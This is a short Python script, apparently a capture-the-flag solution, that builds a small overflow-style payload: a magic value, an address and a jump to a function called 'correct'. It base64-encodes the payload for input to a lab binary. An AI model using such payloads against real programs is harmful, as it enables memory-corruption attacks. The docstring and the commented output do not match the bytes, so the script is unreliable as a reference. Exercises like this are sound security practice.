import base64
'''
first 4 bytes satisfy the condition from the 'correct' function 
padded with 8 'a's and then followed by 
the opcode for call and the address of the function 'correct' 
'''
bytes_for_input = b'\xef\xbe\xad\xde\x0c\x94\x04\x08\x40\xeb\x11\x08'
encoding = base64.b64encode(bytes_for_input)
print(encoding)

# IVIhEegIBJJf